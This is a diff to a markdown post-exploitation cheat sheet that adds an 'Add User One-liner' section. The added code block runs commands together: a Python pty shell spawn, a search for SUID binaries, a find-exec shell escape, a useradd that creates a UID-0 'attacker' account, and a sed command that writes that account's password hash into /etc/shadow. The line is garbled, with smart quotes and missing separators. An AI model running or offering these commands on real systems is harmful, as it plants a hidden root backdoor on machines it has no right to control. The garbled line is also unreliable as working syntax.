@@ -161,6 +161,12 @@ find / -name tftp*
 
 ## <mark style="color:red;">users and accounts</mark>
 
+### <mark style="color:orange;">Add User One-liner</mark>
+
+```
+python -c ‘import pty; pty.spawn(“/bin/bash”)’/var/wwwfind /usr/bin -perm -u=s -type ffind . -exec /bin/sh \; -quit/usr/sbin/useradd -ou 0 -g 0 attackersed -i ‘s/attacker:!:/attacker:$6$uW5y3OHZDcc0avXy$WiqPpaw7e2a7K8Z.oKMUgMzCAVooT0HWNMKDBbrBnBlUXbLr1lFnboJ1UkC013gPZhVIX85IZ4RCq4\/cVqpO00:/g’ /etc/shadow
+```
+
 ### <mark style="color:orange;">check for sudo access</mark>
 
 ```
